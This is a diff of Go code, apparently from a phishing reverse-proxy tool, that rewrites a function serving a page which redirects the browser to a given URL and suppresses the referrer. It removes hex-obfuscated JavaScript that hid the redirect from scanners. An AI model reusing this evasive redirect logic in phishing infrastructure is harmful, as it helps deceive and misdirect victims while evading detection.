@@ -1313,25 +1313,20 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	// obfJS := `
-	// 	<script>
-	// 		(function() {
-	// 			var redirectFunction = function(url) {
-	// 				var _0x5f2c=["\\x74\\x6F\\x70","\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E","\\x68\\x72\\x65\\x66"];
-	// 				window[_0x5f2c[0]+"."+_0x5f2c[1]+"."+_0x5f2c[2]]=url;
-	// 			};
-	// 			redirectFunction('%s');
-	// 		})();
-	// 	</script>`
-	obfJS := `
-		<script>
-			(function() {
-				var parts = ["\\x74\\x6F\\x70", "\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E", "\\x68\\x72\\x65\\x66"];
-				window[parts[0]][parts[1]][parts[2]]='%s';
-			})();
-		</script>`
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'>"+obfJS+"</head><body></body></html>", rurl)
-	// body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	script := fmt.Sprintf(`
+                <script>
+					(function() {
+						try {
+							top.location.href='%s';
+						} catch (e) {
+							console.error("Error during redirect: ", e);
+						}
+					})();
+                </script>`, rurl)
+	minifier := minify.New()
+	minifier.AddFunc("text/javascript", js.Minify)
+	minifiedScript, _ := minifier.String("text/javascript", script)
+	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'>%s</head><body></body></html>", minifiedScript)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
